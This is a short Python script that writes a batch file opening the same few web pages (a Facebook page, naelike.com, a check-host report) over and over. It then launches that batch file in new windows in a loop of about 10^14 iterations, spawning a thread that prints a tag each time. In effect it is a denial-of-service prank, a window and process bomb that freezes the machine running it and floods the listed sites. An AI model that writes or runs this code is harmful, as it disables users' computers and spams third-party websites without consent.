import os
import time
from typing_extensions import runtime
from time import sleep
from threading import Thread

num_windows = 100000000000000
_naewaddao = "main.bat"


with open(_naewaddao, "w") as f:

    print("@echo off",
          file=f)
    print("start https://www.facebook.com/Node.js.SMS",
          file=f)
    print("start https://naelike.com/",
          file=f)
    print("start https://check-host.net/check-report/2718a9akec",
          file=f)
    print("start https://www.facebook.com/Node.js.SMS",
          file=f)
    print("start https://naelike.com/",
          file=f)
    print("start https://check-host.net/check-report/2718a9akec",
          file=f)
    print("start https://www.facebook.com/Node.js.SMS",
          file=f)
    print("start https://naelike.com/",
          file=f)
    print("start https://check-host.net/check-report/2718a9akec",
          file=f)
    print("start https://www.facebook.com/Node.js.SMS",
          file=f)
    print("start https://naelike.com/",
          file=f)
    print("start https://check-host.net/check-report/2718a9akec",
          file=f)
    print("start https://www.facebook.com/Node.js.SMS",
          file=f)
    print("start https://naelike.com/",
          file=f)
    print("start https://check-host.net/check-report/2718a9akec",
          file=f)
    print("start https://www.facebook.com/Node.js.SMS",
          file=f)
    print("start https://naelike.com/",
          file=f)
    print("start https://check-host.net/check-report/2718a9akec",
          file=f)
    print("start https://www.facebook.com/Node.js.SMS",
          file=f)
    print("start https://naelike.com/",
          file=f)
    print("start https://check-host.net/check-report/2718a9akec",
          file=f)

time.sleep(0.01)

def loop1():
      global num_windows
      print("FC Nae Waddao")

for i in range(num_windows):
    time.sleep(0.01)
    os.system(f'start "win {i}" '
              f'main.bat /c "python {_naewaddao}"')

    Thread(target=loop1).start()